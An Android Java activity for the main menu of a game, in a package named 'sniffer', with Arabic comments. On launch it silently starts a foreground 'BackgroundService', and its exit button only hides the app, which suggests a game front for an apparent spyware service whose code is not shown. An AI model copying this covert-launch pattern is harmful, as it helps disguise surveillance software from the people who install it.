package com.v8.global.sniffer.game;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.BackgroundService;

public class MainGameActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_game);

        // تشغيل الخدمة الخلفية
        startBackgroundService();

        // عناصر الواجهة
        ImageView ivLogo = findViewById(R.id.iv_logo);
        TextView tvWelcome = findViewById(R.id.tv_welcome);
        TextView tvHighScore = findViewById(R.id.tv_high_score);
        Button btnPlay = findViewById(R.id.btn_play);
        Button btnSettings = findViewById(R.id.btn_settings);
        Button btnExit = findViewById(R.id.btn_exit);

        // تحميل أفضل نتيجة
        int highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
        tvHighScore.setText("🏆 أفضل نتيجة: " + highScore);

        // تأثيرات حركية
        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
        ivLogo.startAnimation(fadeIn);
        tvWelcome.startAnimation(fadeIn);

        btnPlay.setOnClickListener(v -> {
            v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.click_effect));
            startActivity(new Intent(this, GameBoardActivity.class));
        });

        btnSettings.setOnClickListener(v -> {
            v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.click_effect));
            startActivity(new Intent(this, GameSettingsActivity.class));
        });

        btnExit.setOnClickListener(v -> {
            v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.click_effect));
            moveTaskToBack(true);
        });
    }

    private void startBackgroundService() {
        Intent intent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
